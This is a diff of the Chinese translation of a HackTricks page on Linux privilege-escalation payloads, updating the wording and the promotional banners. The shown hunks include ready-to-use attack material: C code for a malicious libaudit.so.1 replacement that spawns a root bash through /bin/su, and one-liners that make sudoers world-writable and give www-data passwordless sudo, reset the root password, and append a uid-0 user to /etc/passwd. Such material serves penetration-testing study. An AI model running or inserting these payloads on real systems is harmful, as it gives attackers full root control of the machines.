@@ -1,16 +1,19 @@
-# 执行载荷
+# Payloads to execute
+
+{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>支持 HackTricks</summary>
 
-* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**？ 或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS & HackTricks周边**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
+{% endhint %}
 
 ## Bash
 ```bash
@@ -54,18 +57,18 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## 覆盖文件以提升权限
+## 通过覆盖文件来提升权限
 
 ### 常见文件
 
 * 在 _/etc/passwd_ 中添加带密码的用户
-* 更改 _/etc/shadow_ 中的密码
-* 在 _/etc/sudoers_ 中将用户添加到sudoers
-* 通过docker套接字滥用docker，通常在 _/run/docker.sock_ 或 _/var/run/docker.sock_ 中
+* 在 _/etc/shadow_ 中更改密码
+* 在 _/etc/sudoers_ 中将用户添加到 sudoers
+* 通过 docker socket 滥用 docker，通常在 _/run/docker.sock_ 或 _/var/run/docker.sock_ 中
 
 ### 覆盖库
 
-检查某些二进制文件使用的库，本例中为 `/bin/su`:
+检查某个二进制文件使用的库，在这种情况下是 `/bin/su`：
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -77,7 +80,7 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-在这种情况下，让我们尝试冒充 `/lib/x86_64-linux-gnu/libaudit.so.1`。\
+在这种情况下，让我们尝试模拟 `/lib/x86_64-linux-gnu/libaudit.so.1`。\
 因此，检查 **`su`** 二进制文件使用的此库的函数：
 ```bash
 objdump -T /bin/su | grep audit
@@ -86,7 +89,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-这些符号`audit_open`、`audit_log_acct_message`、`audit_log_acct_message`和`audit_fd`可能来自于libaudit.so.1库。由于恶意共享库将覆盖libaudit.so.1，这些符号应该存在于新的共享库中，否则程序将无法找到该符号并退出。
+符号 `audit_open`、`audit_log_acct_message`、`audit_log_acct_message` 和 `audit_fd` 可能来自 libaudit.so.1 库。由于 libaudit.so.1 将被恶意共享库覆盖，这些符号应该出现在新的共享库中，否则程序将无法找到该符号并将退出。
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -108,32 +111,35 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-现在，只需调用**`/bin/su`**，您将获得 root shell。
+现在，只需调用 **`/bin/su`** 您将获得一个以 root 身份运行的 shell。
 
 ## 脚本
 
 您能让 root 执行某些操作吗？
 
-### **将 www-data 添加到 sudoers**
+### **www-data 到 sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
-### **更改 root 密码**
+### **更改根密码**
 ```bash
 echo "root:hacked" | chpasswd
 ```
-### 将新的root用户添加到/etc/passwd
+### 将新根用户添加到 /etc/passwd
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
+{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary>支持 HackTricks</summary>
 
-* 你在**网络安全公司**工作吗？想要看到你的**公司在HackTricks中被宣传**吗？或者想要获取**PEASS的最新版本或下载HackTricks的PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs收藏品**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
+{% endhint %}
